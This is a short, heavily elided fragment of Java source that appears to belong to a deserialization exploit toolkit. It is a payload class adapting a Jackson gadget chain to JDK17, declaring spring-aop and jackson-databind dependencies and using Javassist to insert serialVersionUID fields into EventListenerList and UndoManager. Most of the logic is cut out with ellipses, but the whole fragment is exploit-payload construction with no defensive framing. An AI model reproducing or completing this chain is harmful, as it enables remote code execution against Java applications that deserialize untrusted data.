...
//Jackson2链的JDK17改造
@Dependencies({"spring-aop:6.2.10", "com.fasterxml.jackson.core:jackson-databind>2.9"})
@Authors({Authors.JSJCW})
public class Jackson3_1 implements ObjectPayload<Object> {
    ...
    public static Object getEventListenerList(Object obj) throws Exception {
        ...
        CtClass ctEventListenerList = insertField(
                ...
                "private static final long serialVersionUID = -7977902244297240866;");
        ...
        CtClass ctUndoManager = insertField(
                ...
                "private static final long serialVersionUID = -1045223116463488483L;");
